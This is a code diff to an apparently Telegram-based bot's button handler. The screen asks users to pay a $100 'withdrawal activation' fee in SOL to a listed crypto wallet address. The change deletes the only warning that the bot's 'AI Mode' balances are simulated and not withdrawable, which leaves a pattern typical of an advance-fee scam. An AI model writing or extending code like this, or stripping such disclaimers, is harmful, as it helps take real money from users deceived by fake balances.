@@ -1617,8 +1617,7 @@ async def button_handler(update, context):
         await query.message.reply_text(
             "💳 *AI Mode Withdrawal Feature Activation*\n\n"
             "Requested fee: $100, paid in SOL. Confirm the current SOL equivalent and payment terms with support before sending funds.\n\n"
-            "Address:\n`A5FDfnEvB4BfywU3zW51EDcGLLkBXgFQYJUnHGYNnnY7`\n\n"
-            "Do not treat simulated AI Mode balances as real withdrawable funds. This screen does not confirm payment or grant withdrawal access.",
+            "Address:\n`A5FDfnEvB4BfywU3zW51EDcGLLkBXgFQYJUnHGYNnnY7`\n\n",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔙 Back", callback_data="ai_withdraw_activate")],
